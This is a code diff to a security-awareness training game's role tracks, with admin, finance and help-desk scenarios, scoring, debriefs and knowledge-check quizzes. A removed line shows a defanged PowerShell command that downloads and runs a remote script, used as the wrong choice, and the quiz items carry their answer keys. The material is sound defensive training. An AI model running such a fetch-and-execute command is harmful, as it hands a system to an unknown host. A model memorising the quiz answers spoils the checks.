@@ -1,5 +1,9 @@
 import { beat, q, type Controls } from "@/content/week/make";
 import type { ShiftDef } from "@/content/week/types";
+import type { CheckItem } from "@/game/scenarios";
+import kcAdm from "@/content/week/kc/kc-track-admin.json";
+import kcFin from "@/content/week/kc/kc-track-finance.json";
+import kcHlp from "@/content/week/kc/kc-track-helpdesk.json";
 
 /**
  * Role-based tracks. These close the role-based training controls that a general shift cannot:
@@ -33,13 +37,13 @@ export const ADMIN_TRACK: ShiftDef = {
       id: "ADM-01-pushstorm",
       day: "track-admin",
       skill: "privileged-mfa",
-      controls: plus({ "CIS_v8.1": ["14.3"], HIPAA: ["164.308(a)(5)(ii)(C)"], "NIST_800-53r5": ["AT-2(4)"] }),
+      controls: plus({ "CIS_v8.1": ["14.3"], "NIST_800-53r5": ["AT-2(4)"] }),
       who: "Your phone",
       role: "Authenticator",
       text: "Eleven sign-in prompts in four minutes for your global admin account. You aren't signing in. The twelfth says: approve to stop these notifications.",
       set: "server",
       spot: "phone",
-      prop: { kind: "phone", text: "Approve sign-in? · Admin account · 12th request", textB: "Approved" },
+      prop: { kind: "phone", a: "week/adm-push-a.webp", b: "week/adm-push-b.webp" },
       objective: "Your phone won't stop buzzing on the console.",
       choices: [
         {
@@ -56,9 +60,9 @@ export const ADMIN_TRACK: ShiftDef = {
         },
         {
           id: "adm-push-reset",
-          label: "Deny, reset the admin password from a trusted device, revoke sessions, raise an incident",
+          label: "Deny. Reset the password and revoke sessions from a trusted device, check the sign-in methods, raise the incident now",
           score: 100,
-          debrief: "Someone has the password. Denying isn't enough on an admin account: reset, revoke, and tell the incident lead.",
+          debrief: "Someone has the password. On an admin account, denying is the start: reset, revoke sessions, check they haven't added their own phone, and the incident lead hears now, not after the cleanup.",
           report: "The prompt storm was denied, the admin password reset, sessions revoked and an incident opened.",
         },
         {
@@ -82,7 +86,7 @@ export const ADMIN_TRACK: ShiftDef = {
       set: "server",
       spot: "desk",
       cast: "admin-peer",
-      prop: { kind: "screen", text: "Assign role: Global Administrator", textB: "Global Administrator · vendor-eng@" },
+      prop: { kind: "screen", a: "week/adm-vendor-a.webp", b: "week/adm-vendor-b.webp" },
       objective: "A coworker wants you to grant a vendor access.",
       choices: [
         {
@@ -116,13 +120,13 @@ export const ADMIN_TRACK: ShiftDef = {
       id: "ADM-03-daily",
       day: "track-admin",
       skill: "separate-admin",
-      controls: plus({ "CIS_v8.1": ["14.3"], HIPAA: ["164.308(a)(5)(ii)(D)"] }),
+      controls: plus({ "CIS_v8.1": ["14.3"] }),
       who: "Your browser",
       role: "Signed in as admin",
       text: "You're signed in with your admin account to fix a mailbox. A coworker messages a link to the lunch order form. Your admin session is the only one open.",
       set: "server",
       spot: "console",
-      prop: { kind: "screen", text: "Signed in: admin · new message with link" },
+      prop: { kind: "screen", a: "week/adm-daily-a.webp" },
       objective: "Your console. A link just came in.",
       choices: [
         {
@@ -158,7 +162,7 @@ export const ADMIN_TRACK: ShiftDef = {
       text: "Same error you have. 'Run this one-liner as admin, fixed it for me.' It downloads and runs a script from a site you don't know.",
       set: "server",
       spot: "rack",
-      prop: { kind: "screen", text: "iwr hxxp://fix-tool[.]top/run.ps1 | iex" },
+      prop: { kind: "screen", a: "week/adm-script-a.webp", b: "week/adm-script-b.webp" },
       objective: "The rack is throwing the same error again.",
       choices: [
         {
@@ -167,7 +171,7 @@ export const ADMIN_TRACK: ShiftDef = {
           score: 0,
           debrief: "Download-and-run as admin is handing the server to whoever owns that site today.",
           report: "An unknown script was downloaded and run with admin rights.",
-          fallout: [{ at: 50, who: "Rack", text: "Outbound traffic to an address nobody recognizes." }],
+          fallout: [{ at: 20, who: "Rack", text: "Outbound traffic to an address nobody recognizes.", flip: true }],
         },
         {
           id: "adm-script-review",
@@ -187,6 +191,7 @@ export const ADMIN_TRACK: ShiftDef = {
     }),
   ],
   check: [
+    ...(kcAdm as CheckItem[]),
     q("kc-adm-1", "privileged-mfa", "Repeated MFA prompts you didn't start on an admin account mean:", "The password is known. Reset it, revoke sessions and raise an incident.", "The app is glitching. Approve one.", "Deny them and carry on."),
     q("kc-adm-2", "least-privilege", "A vendor asks for Global Admin to finish setup.", "Grant only the scoped role needed, time-limited, with approval.", "Grant it and remove it after.", "Let them use your account on a call."),
     q("kc-adm-3", "separate-admin", "Which is right for an admin account?", "Admin tasks only. No mail or browsing.", "One account for everything is fine with MFA.", "Admin for daily work, everyday account for admin."),
@@ -215,7 +220,7 @@ export const FINANCE_TRACK: ShiftDef = {
       text: "Hi, I switched banks. Please update my direct deposit before this payroll runs. New details attached. I'm on site all day so email is easiest.",
       set: "floor",
       spot: "desk",
-      prop: { kind: "screen", text: "Direct deposit change · effective this run", textB: "Updated · new account" },
+      prop: { kind: "screen", a: "week/fin-payroll-a.webp", b: "week/fin-payroll-b.webp" },
       objective: "Payroll runs tomorrow. A deposit change is in your inbox.",
       choices: [
         {
@@ -224,7 +229,10 @@ export const FINANCE_TRACK: ShiftDef = {
           score: 0,
           debrief: "Their mailbox was taken over. The real person gets no pay; the money's in a mule account.",
           report: "A direct deposit change was made from an email request.",
-          fallout: [{ at: 60, who: "Staff member", text: "Payday. My pay didn't come in?" }],
+          fallout: [
+            { at: 0, who: "Payroll", text: "Updated. New account on file.", flip: true },
+            { at: 60, who: "Staff member", text: "Payday. My pay didn't come in?" },
+          ],
         },
         {
           id: "fin-payroll-verify",
@@ -254,7 +262,7 @@ export const FINANCE_TRACK: ShiftDef = {
       spot: "phone",
       voiceOnly: true,
       cast: "caller",
-      prop: { kind: "phone", text: "Owner: need 5 gift cards, text me the codes" },
+      prop: { kind: "phone", a: "week/fin-gift-a.webp" },
       objective: "Your phone lit up. It's the owner, apparently.",
       choices: [
         {
@@ -284,14 +292,14 @@ export const FINANCE_TRACK: ShiftDef = {
       id: "FIN-03-vendormaster",
       day: "track-finance",
       skill: "segregation-of-duties",
-      controls: plus({ "NIST_800-53r5": ["AT-2(2)"], "NIST_800-171r2": ["3.2.3"], CMMC_L2: ["AT.L2-3.2.3"] }),
+      controls: plus({ "CIS_v8.1": ["14.2"], "NIST_800-53r5": ["AT-2(2)", "AT-2(3)"], "NIST_800-171r2": ["3.2.3"], CMMC_L2: ["AT.L2-3.2.3"] }),
       who: "Accounts coworker",
       role: "Next desk",
       text: "I changed the bank on our freight vendor earlier. The approver's out. Can you just approve it under your login so tomorrow's batch goes?",
       set: "floor",
       spot: "nextdesk",
       cast: "desk-coworker",
-      prop: { kind: "screen", text: "Vendor change · pending approval · entered by: coworker" },
+      prop: { kind: "screen", a: "week/fin-master-a.webp", b: "week/fin-master-b.webp" },
       objective: "Your coworker needs an approval.",
       choices: [
         {
@@ -300,7 +308,10 @@ export const FINANCE_TRACK: ShiftDef = {
           score: 0,
           debrief: "Two people exist so one mistake or one bad actor can't move money alone. You just made it one.",
           report: "A vendor bank change was approved without independent verification.",
-          fallout: [{ at: 60, who: "Freight vendor", text: "We never got paid. That's not our account." }],
+          fallout: [
+            { at: 0, who: "Screen", text: "Approved.", flip: true },
+            { at: 60, who: "Freight vendor", text: "We never got paid. That's not our account." },
+          ],
         },
         {
           id: "fin-master-callback",
@@ -320,6 +331,7 @@ export const FINANCE_TRACK: ShiftDef = {
     }),
   ],
   check: [
+    ...(kcFin as CheckItem[]),
     q("kc-fin-1", "payroll-diversion", "A direct deposit change arrives by email. What's safe?", "Make or confirm it in the HR portal or by a known number.", "Update it before payroll runs.", "Reply to confirm it's them."),
     q("kc-fin-2", "payment-fraud", "The owner texts asking for gift card codes.", "Call the owner on a number you already have.", "Buy them, you'll be reimbursed.", "Text back to check."),
     q("kc-fin-3", "segregation-of-duties", "Why does a second approver exist?", "So one person can't move money alone, by mistake or on purpose.", "To slow down payments.", "For the auditors only."),
@@ -350,7 +362,7 @@ export const HELPDESK_TRACK: ShiftDef = {
       spot: "console",
       voiceOnly: true,
       cast: "caller",
-      prop: { kind: "screen", text: "Ticket: password reset · VIP · urgent" },
+      prop: { kind: "screen", a: "week/hlp-reset-a.webp", b: "week/hlp-reset-b.webp" },
       objective: "Line one. A VIP is shouting.",
       choices: [
         {
@@ -359,7 +371,10 @@ export const HELPDESK_TRACK: ShiftDef = {
           score: 0,
           debrief: "Urgency and rank are the whole script. That's how most help desk takeovers start.",
           report: "A password was reset and read out to an unverified caller.",
-          fallout: [{ at: 50, who: "Console", text: "CFO mailbox: 40 messages forwarded out in a minute." }],
+          fallout: [
+            { at: 0, who: "Console", text: "Temporary password issued.", flip: true },
+            { at: 50, who: "Console", text: "CFO mailbox: 40 messages forwarded out in a minute." },
+          ],
         },
         {
           id: "hlp-reset-verify",
@@ -381,28 +396,29 @@ export const HELPDESK_TRACK: ShiftDef = {
       id: "HLP-02-mfa",
       day: "track-helpdesk",
       skill: "mfa-reenrollment",
-      controls: plus({ "CIS_v8.1": ["14.3"], HIPAA: ["164.308(a)(5)(ii)(C)"] }),
+      controls: plus({ "CIS_v8.1": ["14.3"] }),
       who: "Chat ticket",
       role: "From a staff member's account",
       text: "New phone, old one's dead. Please remove my MFA so I can set it up on the new phone. Sent from my work account so you know it's me.",
       set: "helpdesk",
       spot: "console",
-      prop: { kind: "screen", text: "Request: remove MFA methods · user: staff" },
+      prop: { kind: "screen", a: "week/hlp-mfa-a.webp", b: "week/hlp-mfa-b.webp" },
       objective: "A chat ticket asking to clear someone's MFA.",
       choices: [
         {
           id: "hlp-mfa-remove",
           label: "Clear their MFA, the request came from their account",
           score: 0,
+          fallout: [{ at: 0, who: "Console", text: "MFA methods cleared.", flip: true }],
           debrief: "If someone else is in that account, you just let them enroll their own phone.",
           report: "MFA was cleared based on a request from the account itself.",
         },
         {
           id: "hlp-mfa-video",
-          label: "Verify identity live (video with ID, or their manager confirms) before resetting MFA",
+          label: "Verify them live first: call back on the directory number, or have their manager confirm",
           score: 100,
-          debrief: "Verified on video, then reset. Thirty seconds of friction, no takeover.",
-          report: "MFA re-enrollment happened only after live identity verification.",
+          debrief: "The callback reached the real person, so the reset was safe. A chat from their account only proves someone is in the account.",
+          report: "MFA re-enrollment happened only after a callback to the directory number.",
         },
         {
           id: "hlp-mfa-tap",
@@ -425,7 +441,7 @@ export const HELPDESK_TRACK: ShiftDef = {
       spot: "phone",
       voiceOnly: true,
       cast: "caller",
-      prop: { kind: "phone", text: "Inbound · unknown · 'external audit'" },
+      prop: { kind: "phone", a: "week/hlp-audit-a.webp" },
       objective: "The desk phone. Someone says audit.",
       choices: [
         {
@@ -453,8 +469,9 @@ export const HELPDESK_TRACK: ShiftDef = {
     }),
   ],
   check: [
+    ...(kcHlp as CheckItem[]),
     q("kc-hlp-1", "identity-verification", "A VIP caller is locked out and in a hurry. How do you verify?", "Call back on the directory number before any reset.", "Ask for their employee ID.", "Their urgency is enough."),
-    q("kc-hlp-2", "mfa-reenrollment", "A request to clear MFA comes from the user's own account. Safe?", "No. Verify the person live first.", "Yes, it's their account.", "Yes, if it's during business hours."),
+    q("kc-hlp-2", "mfa-reenrollment", "A request to clear MFA comes from the user's own account. Safe?", "No. Call back on the directory number first.", "Yes, it's their account.", "Yes, if it's during business hours."),
     q("kc-hlp-3", "disclosure", "A caller asks who has admin rights for an audit.", "Route it to your manager or security lead.", "Answer, audits are normal.", "Answer if they give a company name."),
     q("kc-hlp-4", "identity-verification", "Why aren't knowledge questions good verification?", "The answers are often public or guessable.", "They take too long.", "Users forget them."),
     q("kc-hlp-5", "mfa-reenrollment", "Where should a temporary access pass go?", "To the verified person, through a verified channel.", "To whatever chat asked for it.", "To the user's manager by default."),
